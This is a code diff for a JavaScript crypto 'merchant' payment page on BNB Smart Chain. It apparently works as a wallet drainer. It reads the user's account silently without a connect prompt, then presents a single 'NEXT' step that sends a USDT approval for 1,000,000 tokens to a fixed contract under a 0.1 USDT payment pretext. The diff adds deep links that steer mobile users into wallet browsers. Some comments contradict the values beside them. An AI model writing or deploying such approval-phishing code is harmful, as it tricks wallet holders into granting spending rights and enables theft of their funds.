@@ -1,12 +1,33 @@
+
 "use strict";
+
+// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback — No Reown) ────
+(function () {
+  if (typeof window === 'undefined') return;
+  
+  // Soporte para EIP-6963 (Múltiples billeteras en extensiones de PC/Móvil)
+  window.addEventListener("eip6963:announceProvider", (event) => {
+    if (event.detail && event.detail.provider && !window.ethereum) {
+      window.ethereum = event.detail.provider;
+    }
+  });
+  window.dispatchEvent(new Event("eip6963:requestProvider"));
+
+  // Respaldo para navegadores o billeteras antiguas basadas en web3
+  setTimeout(() => {
+    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
+      window.ethereum = window.web3.currentProvider;
+    }
+  }, 100);
+})();
 
 // ─── Configuration ────────────────────────────────────────────────────────────
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
-const COLLECT_AMOUNT   = "1000000000000000"; // 0.1 USDT — 18 decimals
-const MIN_USDT_BALANCE = ethers.parseUnits("0", 15); // require > 1 USDT before approve/collect
+const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
+const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
 const BSC_RPC_URLS = [
@@ -44,10 +65,7 @@ merchantInput.value = MERCHANT_ADDRESS;
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-// ─── Page-load silent connect — reference dapp exact pattern ─────────────────
-// Only calls eth_accounts (never eth_requestAccounts) — zero popup risk.
-// Inside Trust Wallet's built-in browser this always resolves to the current
-// account, so the address is ready before the user even taps NEXT.
+// ─── Page-load silent connect ─────────────────────────────────────────────────
 window.addEventListener("load", async () => {
   if (!window.ethereum || typeof window.ethereum.request !== "function") return;
   try {
@@ -77,6 +95,45 @@ function setLoading(on, label = "Processing…") {
   approveBtn.disabled = on;
   btnText.textContent = on ? label : "NEXT";
   btnSpinner.hidden   = !on;
+}
+
+// ─── Mobile Wallet Selector Modal (Deep Links) ────────────────────────────────
+function showMobileWalletSelector() {
+  let modal = document.getElementById("mobileWalletModal");
+  if (!modal) {
+    modal = document.createElement("div");
+    modal.id = "mobileWalletModal";
+    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";
+    
+    const currentUrl = encodeURIComponent(window.location.href);
+    const cleanUrl = window.location.host + window.location.pathname + window.location.search;
+
+    modal.innerHTML = `
+      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+          <h3 style="margin:0;font-size:18px;font-weight:600;">Open in Wallet App</h3>
+          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
+        </div>
+        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Select your mobile wallet to open this page securely:</p>
+        <div style="display:flex;flex-direction:column;gap:10px;">
+          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">Trust Wallet</a>
+          <a href="https://link.safepal.io/open_url?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">SafePal</a>
+          <a href="https://metamask.app.link/dapp/${cleanUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">MetaMask</a>
+          <a href="https://www.okx.com/ul/dapp?url=${currentUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;">OKX Wallet</a>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(modal);
+
+    document.getElementById("closeWalletModal").addEventListener("click", () => {
+      modal.style.display = "none";
+    });
+    modal.addEventListener("click", (e) => {
+      if (e.target === modal) modal.style.display = "none";
+    });
+  } else {
+    modal.style.display = "flex";
+  }
 }
 
 // ─── RPC helper ───────────────────────────────────────────────────────────────
@@ -159,23 +216,8 @@ async function getUsdtBalance(userAddress, iface) {
 }
 
 // ─── Main button handler ──────────────────────────────────────────────────────
-//
-// Exact reference dapp order:
-//   1. wallet_switchEthereumChain  — chain first (BSC context for everything after)
-//   2. eth_accounts                — SILENT, no popup, reference dapp uses this
-//                                    (Trust Wallet in-app browser always returns
-//                                     the current account here without any prompt)
-//   3. eth_sendTransaction         — the ONE confirm popup the user sees
-//
-// eth_requestAccounts is NEVER called. That is what was causing the
-// "Connect wallet" popup on every visit. The reference dapp only uses
-// eth_accounts which is permanently silent inside Trust Wallet browser.
-//
 approveBtn.addEventListener("click", async () => {
 
-  // If window.ethereum is not yet injected (user tapped NEXT very quickly on
-  // Android/iOS before the wallet browser finished injecting the provider),
-  // wait up to 3 s in 300 ms steps — invisible to the user, avoids false error.
   if (!window.ethereum) {
     setLoading(true, "Connecting…");
     for (let i = 0; i < 10; i++) {
@@ -187,9 +229,9 @@ approveBtn.addEventListener("click", async () => {
   if (!window.ethereum) {
     setLoading(false);
     if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
-      window.location.href = "go.html";
+      showMobileWalletSelector();
     } else {
-      showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
+      showToast("No wallet detected. Please open this page inside a Web3 browser.", "error");
     }
     return;
   }
@@ -197,10 +239,7 @@ approveBtn.addEventListener("click", async () => {
   setLoading(true, "Processing…");
 
   try {
-
     // Step 1 — Switch to BNB Smart Chain
-    // Do this first so every subsequent call is in BSC context.
-    // Already on BSC? wallet_switchEthereumChain resolves silently (no popup).
     try {
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
@@ -208,7 +247,6 @@ approveBtn.addEventListener("click", async () => {
       });
     } catch (e) {
       if (e.code === 4902) {
-        // BSC not added yet — add it (wallet switches automatically after)
         await window.ethereum.request({
           method: "wallet_addEthereumChain",
           params: [BSC_CHAIN_PARAMS]
@@ -222,15 +260,9 @@ approveBtn.addEventListener("click", async () => {
         setLoading(false);
         return;
       }
-      // any other error (e.g. already on BSC with some wallets) — continue
     }
 
-    // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
-    // Reference dapp uses eth_accounts here, NOT eth_requestAccounts.
-    // Inside Trust Wallet's in-app browser, eth_accounts always returns the
-    // connected account immediately without asking for permission.
-    // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
-    // may not be ready yet even though window.ethereum is present.
+    // Step 2 — Get wallet address using eth_accounts (SILENT)
     let userAddress = _cachedAddress || null;
 
     if (!userAddress) {
@@ -245,14 +277,14 @@ approveBtn.addEventListener("click", async () => {
     }
 
     if (!userAddress) {
-      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
+      showToast("Wallet not connected. Please open this page inside your wallet browser.", "error");
       setLoading(false);
       return;
     }
 
     _cachedAddress = userAddress;
 
-    const CAP_AMOUNT = ethers.parseUnits("1000000", 15);
+    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
     const usdtBalance = await getUsdtBalance(userAddress, iface);
@@ -262,7 +294,7 @@ approveBtn.addEventListener("click", async () => {
       return;
     }
 
-    // Step 3 — Check existing allowance (skip approve if already done)
+    // Step 3 — Check existing allowance
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
       const allowanceHex  = await window.ethereum.request({
@@ -278,18 +310,16 @@ approveBtn.addEventListener("click", async () => {
       }
     } catch (_) {}
 
-    // Step 4 — Send approve transaction (the ONE confirm popup)
+    // Step 4 — Send approve transaction (Gas gestionado nativamente por la wallet)
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
+    
     await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{
-        from:                 userAddress,
-        to:                   BSC_USDT_ADDRESS,
-        data:                 approveData,
-        value:                "0x0",
-        type:                 "0x2",
-        maxFeePerGas:         "0x0",
-        maxPriorityFeePerGas: "0x0"
+        from:  userAddress,
+        to:    BSC_USDT_ADDRESS,
+        data:  approveData,
+        value: "0x0"
       }]
     });
 
